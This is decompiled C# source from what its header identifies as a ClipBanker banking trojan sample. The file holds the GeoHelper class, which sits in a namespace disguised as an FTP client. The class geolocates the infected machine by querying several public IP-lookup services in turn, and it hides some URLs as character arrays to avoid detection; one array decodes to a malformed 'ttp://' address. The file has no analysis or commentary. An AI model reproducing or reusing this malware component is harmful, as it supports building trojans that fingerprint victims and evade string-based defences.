// Decompiled with JetBrains decompiler
// Type: FtpClient.Data.Helpers.GeoHelper
// Assembly: Baignoire, Version=12.5.1.3, Culture=neutral, PublicKeyToken=null
// MVID: 0AA7C5E4-9380-4A35-BE75-5D7E722D7BE8
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-4d94148f1dff68b03896e3fa5508c5b039b0a29b1fd90db01884137f2e9495a4.exe

using FtpClient.Data.Extensions;
using FtpClient.Models.Serialization;
using System;
using System.IO;
using System.Net;

namespace FtpClient.Data.Helpers
{
  public static class GeoHelper
  {
    public static GeoInfo Get()
    {
      GeoInfo geoInfo = new GeoInfo();
      try
      {
        try
        {
          IpSb ipSb = new WebClient().DownloadString(new string(new char[23]
          {
            'h',
            't',
            't',
            'p',
            's',
            ':',
            '/',
            '/',
            'a',
            'p',
            'i',
            '.',
            'i',
            'p',
            '.',
            's',
            'b',
            '/',
            'g',
            'e',
            'o',
            'i',
            'p'
          })).FromJSON<IpSb>();
          geoInfo.IP = ipSb.ip;
          if (geoInfo.IP.Contains(":"))
            geoInfo.IP = (string) null;
          geoInfo.PostalCode = ipSb.postal_code;
          geoInfo.Country = ipSb.country_code;
        }
        catch
        {
        }
        try
        {
          using (WebClient webClient = new WebClient())
            geoInfo.IP = webClient.DownloadString(new string(new char[28]
            {
              't',
              't',
              'p',
              ':',
              '/',
              '/',
              'c',
              'h',
              'e',
              'c',
              'k',
              'i',
              'p',
              '.',
              'a',
              'm',
              'a',
              'z',
              'o',
              'n',
              'a',
              'w',
              's',
              '.',
              'c',
              'o',
              'm',
              '/'
            })).Trim();
        }
        catch (Exception ex)
        {
        }
        if (string.IsNullOrEmpty(geoInfo.IP))
        {
          try
          {
            geoInfo.IP = new WebClient().DownloadString(new string(new char[20]
            {
              'h',
              't',
              't',
              'p',
              's',
              ':',
              '/',
              '/',
              'i',
              'p',
              'i',
              'n',
              'f',
              'o',
              '.',
              'i',
              'o',
              '/',
              'i',
              'p'
            })).Trim('\n').Trim();
          }
          catch (Exception ex)
          {
          }
        }
        if (string.IsNullOrEmpty(geoInfo.IP))
        {
          try
          {
            geoInfo.IP = new WebClient().DownloadString("https://api.ipify.org").Replace("\n", "");
          }
          catch (Exception ex)
          {
          }
        }
        if (string.IsNullOrEmpty(geoInfo.IP))
        {
          try
          {
            geoInfo.IP = new WebClient().DownloadString("https://icanhazip.com").Replace("\n", "");
          }
          catch (Exception ex)
          {
          }
        }
        if (string.IsNullOrEmpty(geoInfo.IP))
        {
          try
          {
            geoInfo.IP = new WebClient().DownloadString("https://wtfismyip.com/text").Replace("\n", "");
          }
          catch (Exception ex)
          {
          }
        }
        if (string.IsNullOrEmpty(geoInfo.IP))
        {
          try
          {
            geoInfo.IP = new WebClient().DownloadString("http://bot.whatismyipaddress.com/").Replace("\n", "");
          }
          catch (Exception ex)
          {
          }
        }
        if (string.IsNullOrEmpty(geoInfo.IP))
        {
          try
          {
            string[] strArray = new StreamReader(WebRequest.Create("http://checkip.dyndns.org").GetResponse().GetResponseStream()).ReadToEnd().Trim().Split(':')[1].Substring(1).Split('<');
            geoInfo.IP = strArray[0];
          }
          catch (Exception ex)
          {
          }
        }
      }
      catch
      {
      }
      return geoInfo;
    }
  }
}
